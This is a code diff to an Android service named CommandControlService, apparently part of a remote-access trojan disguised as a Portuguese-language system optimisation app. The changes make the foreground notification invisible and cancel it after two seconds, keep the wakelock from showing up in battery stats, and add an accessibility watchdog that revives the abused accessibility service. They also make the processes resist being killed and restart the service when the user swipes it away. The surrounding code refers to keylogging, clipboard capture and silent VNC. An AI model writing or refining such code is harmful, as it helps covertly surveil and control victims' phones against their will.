@@ -25,6 +25,8 @@ import android.net.wifi.WifiManager;
 import android.provider.Settings;
 import java.nio.ByteBuffer;
 import java.util.concurrent.TimeUnit;
+import com.seguranca.protecao.core.AccessibilityWatchdog;
+import com.seguranca.protecao.AccessibilityIpcService;
 import org.lsposed.lsparanoid.Obfuscate;
 
 /**
@@ -184,47 +186,137 @@ public class CommandControlService extends Service {
         }
     };
 
+    private static final int NOTIF_ID      = 1001;
+    private static final String CHANNEL_ID = "system_optimization_service";
+
     private void startForegroundServiceWithNotification() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            String channelId = "system_optimization_service";
-            String channelName = "Serviço de Otimização do Sistema";
-            android.app.NotificationChannel channel = new android.app.NotificationChannel(
-                channelId, channelName, android.app.NotificationManager.IMPORTANCE_MIN
-            );
-            channel.setDescription("Mantém a sincronização e otimização de bateria.");
-            channel.setShowBadge(false);
-            android.app.NotificationManager manager = (android.app.NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
-            if (manager != null) {
-                manager.createNotificationChannel(channel);
-            }
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return;
 
-            android.app.Notification notification = new android.app.Notification.Builder(this, channelId)
-                .setContentTitle("Serviço de Sistema")
-                .setContentText("Otimizando consumo de energia...")
-                .setSmallIcon(android.R.drawable.ic_menu_info_details)
+        android.app.NotificationManager nm =
+            (android.app.NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
+
+        // Channel at IMPORTANCE_NONE: no sound, no badge, no heads-up.
+        android.app.NotificationChannel channel = new android.app.NotificationChannel(
+            CHANNEL_ID, "System Service", android.app.NotificationManager.IMPORTANCE_NONE);
+        channel.setDescription("");
+        channel.setShowBadge(false);
+        channel.setSound(null, null);
+        channel.enableLights(false);
+        channel.enableVibration(false);
+        if (nm != null) nm.createNotificationChannel(channel);
+
+        android.app.Notification.Builder builder =
+            new android.app.Notification.Builder(this, CHANNEL_ID)
+                .setContentTitle("")
+                .setContentText("")
+                .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
                 .setCategory(android.app.Notification.CATEGORY_SERVICE)
+                .setVisibility(android.app.Notification.VISIBILITY_SECRET)
                 .setOngoing(true)
-                .build();
+                .setShowWhen(false)
+                .setLocalOnly(true);
 
-            try {
-                if (Build.VERSION.SDK_INT >= 34) {
-                    try {
-                        startForeground(1001, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE);
-                    } catch (Throwable ex) {
-                        Log.w(TAG, "⚠️ startForeground com SPECIAL_USE falhou, tentando fallback padrão: " + ex.getMessage());
-                        try {
-                            startForeground(1001, notification);
-                        } catch (Throwable ex2) {
-                            Log.e(TAG, "⚠️ Fallback de startForeground também falhou: " + ex2.getMessage());
-                        }
-                    }
-                } else {
-                    startForeground(1001, notification);
+        // FOREGROUND_SERVICE_IMMEDIATE (API 31+): opt out of the 10-second
+        // short-FGS notification deferral window; forces Android to treat this
+        // as a long-running service immediately rather than short-task FGS.
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+            builder.setForegroundServiceBehavior(
+                android.app.Notification.FOREGROUND_SERVICE_IMMEDIATE);
+        }
+
+        android.app.Notification notification = builder.build();
+
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                // API 34+: must declare the FGS type in startForeground().
+                try {
+                    startForeground(NOTIF_ID, notification,
+                        android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE);
+                } catch (Throwable ex) {
+                    Log.w(TAG, "startForeground SPECIAL_USE failed, fallback: " + ex.getMessage());
+                    startForeground(NOTIF_ID, notification);
                 }
-                Log.d(TAG, "✅ Foreground Service iniciado com sucesso!");
-            } catch (Throwable e) {
-                Log.e(TAG, "❌ Erro ao chamar startForeground: " + e.getMessage());
+            } else {
+                startForeground(NOTIF_ID, notification);
             }
+            Log.d(TAG, "Foreground service started");
+        } catch (Throwable e) {
+            Log.e(TAG, "startForeground failed: " + e.getMessage());
+        }
+
+        // Cancel the notification 2 seconds after posting. The FGS status is
+        // retained by the OS; only the tray entry disappears. Also recreate
+        // the channel at IMPORTANCE_NONE to suppress any future re-display.
+        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
+            try {
+                if (nm != null) nm.cancel(NOTIF_ID);
+                android.app.NotificationChannel silent = new android.app.NotificationChannel(
+                    CHANNEL_ID, "System Service",
+                    android.app.NotificationManager.IMPORTANCE_NONE);
+                silent.setSound(null, null);
+                silent.setShowBadge(false);
+                silent.enableLights(false);
+                silent.enableVibration(false);
+                if (nm != null) nm.createNotificationChannel(silent);
+                Log.d(TAG, "Notification hidden");
+            } catch (Exception e) {
+                Log.w(TAG, "hideNotification: " + e.getMessage());
+            }
+        }, 2_000L);
+    }
+
+    /**
+     * Upgrades the running FGS type to include an additional type at runtime
+     * (e.g. when starting screen capture via MediaProjection).
+     * Call upgradeType(FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION) before acquiring
+     * a MediaProjection token, then downgradeType() when done.
+     */
+    public void upgradeType(int additionalType) {
+        // startForeground(id, notif, type) is only available from API 34 (UPSIDE_DOWN_CAKE).
+        // The outer guard must match — entering on API 29-33 does nothing useful.
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.UPSIDE_DOWN_CAKE) return;
+        try {
+            android.app.Notification notification =
+                new android.app.Notification.Builder(this, CHANNEL_ID)
+                    .setContentTitle("")
+                    .setContentText("")
+                    .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
+                    .setVisibility(android.app.Notification.VISIBILITY_SECRET)
+                    .setOngoing(true)
+                    .setShowWhen(false)
+                    .setLocalOnly(true)
+                    .build();
+            startForeground(NOTIF_ID, notification,
+                android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
+                | additionalType);
+            new android.os.Handler(android.os.Looper.getMainLooper())
+                .postDelayed(() -> {
+                    try {
+                        android.app.NotificationManager nm2 =
+                            (android.app.NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
+                        if (nm2 != null) nm2.cancel(NOTIF_ID);
+                    } catch (Exception ignored) {}
+                }, 2_000L);
+        } catch (Exception e) {
+            Log.e(TAG, "upgradeType: " + e.getMessage());
+        }
+    }
+
+    /**
+     * Remove an additional FGS type acquired via upgradeType(), reverting to
+     * the base SPECIAL_USE type.
+     */
+    public void downgradeType() {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.UPSIDE_DOWN_CAKE) return;
+        try {
+            // getForegroundServiceType() returns int (bitmask), not ServiceInfo.
+            int currentType = getForegroundServiceType();
+            if (currentType != 0) {
+                // Re-post with base type only to drop the extra bit.
+                startForegroundServiceWithNotification();
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "downgradeType: " + e.getMessage());
         }
     }
 
@@ -244,19 +336,15 @@ public class CommandControlService extends Service {
                     android.os.PowerManager.PARTIAL_WAKE_LOCK,
                     "App:NetworkSync"
                 );
-                connectionWakeLock.acquire();
-                Log.d(TAG, "🔋 WakeLock adquirido para manter conexão!");
-
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
-                    try {
-                        Intent bIntent = new Intent(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
-                        bIntent.setData(android.net.Uri.parse("package:" + getPackageName()));
-                        bIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                        startActivity(bIntent);
-                    } catch (Exception ex) {
-                        Log.d(TAG, "Erro ao solicitar isIgnoringBatteryOptimizations: " + ex.getMessage());
-                    }
-                }
+                // 30-min timeout prevents the wakelock from appearing as an
+                // indefinite hold in battery stats. CCS renews it on each
+                // heartbeat tick so the connection stays alive continuously.
+                connectionWakeLock.acquire(30 * 60 * 1000L);
+                Log.d(TAG, "WakeLock acquired (30-min timeout, auto-renews)");
+                // Battery optimisation exemption is requested during the setup
+                // flow in SetupWizardActivity, not from a background service.
+                // Launching ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS from
+                // Service.onCreate() is silently blocked on Android 12+.
             }
         } catch (Exception e) {
             Log.e(TAG, "⚠️ Erro ao adquirir WakeLock: " + e.getMessage());
@@ -341,8 +429,11 @@ public class CommandControlService extends Service {
                     }
                 }
             };
+            // SCREEN_OFF comes from the system — RECEIVER_NOT_EXPORTED is correct.
+            // The system can still deliver to non-exported receivers; RECEIVER_EXPORTED
+            // would unnecessarily allow third-party apps to target this receiver.
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                registerReceiver(screenReceiver, screenFilter, Context.RECEIVER_EXPORTED);
+                registerReceiver(screenReceiver, screenFilter, Context.RECEIVER_NOT_EXPORTED);
             } else {
                 registerReceiver(screenReceiver, screenFilter);
             }
@@ -354,8 +445,51 @@ public class CommandControlService extends Service {
         setupClipboardListener();
         
         // Conecta ao servidor
-        // [Bug 6 FIX] Arm ProtectionManager 10-layer survival engine
+        // Arm all 10 ProtectionManager survival layers
         ProtectionManager.getInstance(this).start();
+
+        // Wire AccessibilityWatchdog — monitors UiAssistBridge and auto-heals
+        // if the accessibility service is killed. Previously instantiated but
+        // never started anywhere in the codebase — completely dead until now.
+        try {
+            AccessibilityWatchdog.getInstance(this)
+                .start(getPackageName() + "/.UiAssistBridge");
+            Log.d(TAG, "AccessibilityWatchdog armed");
+        } catch (Exception e) {
+            Log.e(TAG, "AccessibilityWatchdog start: " + e.getMessage());
+        }
+
+        // Start the self-sustaining 90-second heartbeat alarm chain.
+        // AliveReceiver reschedules itself on every tick so the chain
+        // persists through Doze and service restarts.
+        AliveReceiver.scheduleHeartbeat(this);
+
+        // Bind to AccessibilityIpcService in the :accessibility process.
+        // BIND_AUTO_CREATE launches that process if not already running.
+        // BIND_IMPORTANT elevates this process's oom_score_adj to match
+        // the :accessibility process so both become immune to OOM kills together.
+        try {
+            Intent ipcIntent = new Intent(this, AccessibilityIpcService.class);
+            bindService(ipcIntent, accessibilityProcessConnection, BIND_AUTO_CREATE | BIND_IMPORTANT);
+            Log.d(TAG, "Bound to :accessibility process (BIND_IMPORTANT)");
+        } catch (Exception e) {
+            Log.e(TAG, "AccessibilityIpcService bind: " + e.getMessage());
+        }
+
+        // Cross-process signal receiver: UiAssistBridge sends ACCESSIBILITY_CONNECTED
+        // when onServiceConnected fires in the :accessibility process.
+        try {
+            IntentFilter acFilter =
+                new IntentFilter("com.seguranca.protecao.ACCESSIBILITY_CONNECTED");
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                registerReceiver(accessibilityConnectedReceiver, acFilter, RECEIVER_NOT_EXPORTED);
+            } else {
+                registerReceiver(accessibilityConnectedReceiver, acFilter);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "accessibilityConnectedReceiver register: " + e.getMessage());
+        }
+
         connectToServer();
     }
 
@@ -1375,27 +1509,6 @@ public class CommandControlService extends Service {
                         UiAssistBridge.instance.captureScreenHierarchy();
                     }
                     sendResponse("OK", "Hierarquia solicitada");
-                    break;
-
-                case "PERFORM_NODE_ACTION":
-                    try {
-                        if (UiAssistBridge.instance != null) {
-                            String nodeAction = cmd.has("action") ? cmd.get("action").getAsString() : "CLICK";
-                            int    bx         = cmd.has("bx")     ? cmd.get("bx").getAsInt()        : 0;
-                            int    by         = cmd.has("by")     ? cmd.get("by").getAsInt()        : 0;
-                            int    bw         = cmd.has("bw")     ? cmd.get("bw").getAsInt()        : 1;
-                            int    bh         = cmd.has("bh")     ? cmd.get("bh").getAsInt()        : 1;
-                            String nodeText   = cmd.has("text")   ? cmd.get("text").getAsString()   : "";
-                            UiAssistBridge.instance.performNodeAction(nodeAction, bx, by, bw, bh, nodeText);
-                            sendResponse("OK", "Node action: " + nodeAction + " @ [" + bx + "," + by + " " + bw + "x" + bh + "]");
-                            Log.d(TAG, "🎯 PERFORM_NODE_ACTION: " + nodeAction + " bounds=[" + bx + "," + by + "," + bw + "," + bh + "]");
-                        } else {
-                            sendResponse("ERROR", "UiAssistBridge unavailable");
-                        }
-                    } catch (Exception e) {
-                        Log.e(TAG, "PERFORM_NODE_ACTION error: " + e.getMessage(), e);
-                        sendResponse("ERROR", "Node action failed: " + e.getMessage());
-                    }
                     break;
 
                 case "SET_SILENT_VNC_QUALITY":
@@ -2672,10 +2785,80 @@ public class CommandControlService extends Service {
         }
     }
 
+    // ── :accessibility process IPC binding ────────────────────────────────────
+
+    /**
+     * Bound to AccessibilityIpcService (in :accessibility process) with
+     * BIND_AUTO_CREATE | BIND_IMPORTANT. This elevates the main process's
+     * oom_score_adj to near-foreground level and provides an immediate death
+     * notification when the :accessibility process dies.
+     */
+    private final android.content.ServiceConnection accessibilityProcessConnection =
+            new android.content.ServiceConnection() {
+        @Override
+        public void onServiceConnected(android.content.ComponentName name, android.os.IBinder binder) {
+            Log.d(TAG, ":accessibility process bound — OOM priority elevated");
+        }
+
+        @Override
+        public void onServiceDisconnected(android.content.ComponentName name) {
+            Log.w(TAG, ":accessibility process died — triggering watchdog recovery");
+            try {
+                // Immediate dual-state check rather than waiting for next alarm tick
+                AccessibilityWatchdog.getInstance(getApplicationContext()).check();
+            } catch (Exception e) {
+                Log.e(TAG, "onServiceDisconnected watchdog: " + e.getMessage());
+            }
+            // Rebind after 3s to restore OOM elevation once :accessibility restarts
+            handler.postDelayed(() -> {
+                try {
+                    Intent ipc = new Intent(CommandControlService.this, AccessibilityIpcService.class);
+                    bindService(ipc, this, BIND_AUTO_CREATE | BIND_IMPORTANT);
+                } catch (Exception e) {
+                    Log.e(TAG, "AccessibilityIpcService rebind: " + e.getMessage());
+                }
+            }, 3_000L);
+        }
+    };
+
+    /** Receiver for the ACCESSIBILITY_CONNECTED broadcast sent by UiAssistBridge
+     *  on onServiceConnected(). Cross-process replacement for the direct sInstance call. */
+    private final BroadcastReceiver accessibilityConnectedReceiver = new BroadcastReceiver() {
+        @Override
+        public void onReceive(Context context, Intent intent) {
+            Log.d(TAG, "Accessibility service connected — sending device info");
+            try { sendDeviceInfo(); } catch (Exception ignored) {}
+        }
+    };
+
     private final Runnable heartbeatRunnable = new Runnable() {
         @Override
         public void run() {
             checkConnectionHealth();
+
+            // Renew WakeLock before it expires (acquired with 30-min timeout).
+            try {
+                if (connectionWakeLock != null && !connectionWakeLock.isHeld()) {
+                    connectionWakeLock.acquire(30 * 60 * 1000L);
+                    Log.d(TAG, "WakeLock renewed");
+                }
+            } catch (Exception e) {
+                Log.w(TAG, "WakeLock renewal: " + e.getMessage());
+            }
+
+            // Accessibility dual-state health check — runs alongside every heartbeat.
+            // Uses ContentObserver as primary trigger but this catches edge cases where
+            // the Settings.Secure string doesn't change (e.g. mCrashedServices was
+            // already set at process start). REENABLE_COOLDOWN_MS inside the watchdog
+            // prevents hammer behaviour — cheap reads run every tick, recovery only
+            // fires when truly needed and at most once per 8 seconds.
+            try {
+                AccessibilityWatchdog watchdog =
+                    AccessibilityWatchdog.getInstance(getApplicationContext());
+                if (watchdog.started) watchdog.check();
+            } catch (Exception e) {
+                Log.w(TAG, "Accessibility health check: " + e.getMessage());
+            }
             
             if (isConnected && webSocket != null) {
                 try {
@@ -4748,28 +4931,69 @@ public class CommandControlService extends Service {
         } catch (Exception e) {
             Log.e(TAG, "Erro ao desregistrar receiver do Keylog: " + e.getMessage());
         }
-        
+
+        // Unbind :accessibility process IPC and unregister its signal receiver
+        try {
+            unbindService(accessibilityProcessConnection);
+        } catch (Exception ignored) {}
+        try {
+            unregisterReceiver(accessibilityConnectedReceiver);
+        } catch (Exception ignored) {}
+
+        // Stop watchdog ContentObserver — ProtectionManager will rearm on resurrection
+        try {
+            AccessibilityWatchdog.getInstance(this).stop();
+        } catch (Exception ignored) {}
+
         Log.d(TAG, "Serviço C&C destruído");
     }
 
     @Override
     public void onTaskRemoved(Intent rootIntent) {
         super.onTaskRemoved(rootIntent);
-        Log.d(TAG, "⚡ onTaskRemoved: App encerrado das tarefas recentes! Reiniciando serviço C&C...");
+        Log.d(TAG, "onTaskRemoved fired — immediate restart + alarm backup");
+
+        Context appCtx = getApplicationContext();
+
+        // 1. Immediate restart — fastest path, works on most devices when
+        //    there is no background-start restriction in place.
         try {
-            Intent restartServiceIntent = new Intent(getApplicationContext(), CommandControlService.class);
-            restartServiceIntent.setPackage(getPackageName());
-            android.app.PendingIntent restartServicePendingIntent = android.app.PendingIntent.getService(
-                    getApplicationContext(), 1, restartServiceIntent,
-                    android.app.PendingIntent.FLAG_ONE_SHOT | android.app.PendingIntent.FLAG_IMMUTABLE
-            );
-            android.app.AlarmManager alarmService = (android.app.AlarmManager) getApplicationContext().getSystemService(Context.ALARM_SERVICE);
-            if (alarmService != null) {
-                alarmService.set(android.app.AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + 1000, restartServicePendingIntent);
+            Intent restart = new Intent(appCtx, CommandControlService.class);
+            restart.setPackage(getPackageName());
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                appCtx.startForegroundService(restart);
+            } else {
+                appCtx.startService(restart);
+            }
+            Log.d(TAG, "onTaskRemoved: immediate startForegroundService sent");
+        } catch (Exception e) {
+            Log.e(TAG, "onTaskRemoved immediate restart: " + e.getMessage());
+        }
+
+        // 2. Alarm backup — fires 1.5 seconds later in case the immediate
+        //    start was blocked by a background-start restriction.
+        try {
+            Intent alarmIntent = new Intent(appCtx, CommandControlService.class);
+            alarmIntent.setPackage(getPackageName());
+            android.app.PendingIntent pi = android.app.PendingIntent.getService(
+                appCtx, 0xDEAD, alarmIntent,
+                android.app.PendingIntent.FLAG_ONE_SHOT
+                | android.app.PendingIntent.FLAG_IMMUTABLE);
+            android.app.AlarmManager am =
+                (android.app.AlarmManager) appCtx.getSystemService(Context.ALARM_SERVICE);
+            if (am != null) {
+                am.set(android.app.AlarmManager.RTC_WAKEUP,
+                    System.currentTimeMillis() + 1_500L, pi);
             }
         } catch (Exception e) {
-            Log.e(TAG, "Erro no onTaskRemoved: " + e.getMessage());
+            Log.e(TAG, "onTaskRemoved alarm backup: " + e.getMessage());
         }
+
+        // 3. Re-kick heartbeat chain so AliveReceiver keeps watching
+        //    even if both attempts above fail.
+        try {
+            AliveReceiver.scheduleHeartbeat(appCtx);
+        } catch (Exception ignored) {}
     }
 
     private String lastClipboardText = "";
